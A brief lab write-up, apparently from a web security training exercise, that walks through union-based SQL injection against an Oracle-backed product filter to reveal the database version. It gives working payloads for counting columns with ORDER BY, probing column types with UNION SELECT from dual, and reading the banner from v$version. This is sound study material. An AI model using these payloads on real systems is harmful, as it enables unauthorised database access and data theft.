# Fourth Lab: SQL Injection

Lab - 04 : SQL injection attack querying the database type and version of Oracle

SQL Injection : Product category filter

Endgoal : Display the database version string

 Analysis : 

1. Check the url with ‘ and concluded it has sql injection issues.
2. To output data from the database, 
    1. Determine the number of columns
        
        ```
        Payload -> ' order by 1--
        ```
        
        we sent this payload until we determine the number of columns. The last integer the website doesn’t give an internal server error, that is the number of columns.  
        
        ![vmplayer_k1VoCdG73a.png](Fourth%20Lab%20SQL%20Injection%2021a3c5d54c768062be65f47e991db223/vmplayer_k1VoCdG73a.png)
        
        Checking the payload
        
        No of columns = 2.
        
    2. Determining the database type of the column
        
        We guess that both the columns must be of string type.
        
        ```
        Payload -> ' union select 'a', 'b' from dual--
        [oracle database so, have to use from clause]  
        ```
        
    3. Outputting the version of the database
        
        ```
        Payload -> ' UNION SELECT banner, NULL FROM v$version--
        or
        Payload -> ' UNION SELECT version, NULL FROM v$instance--
        this payload does not work for some reason i don't know. 
        ```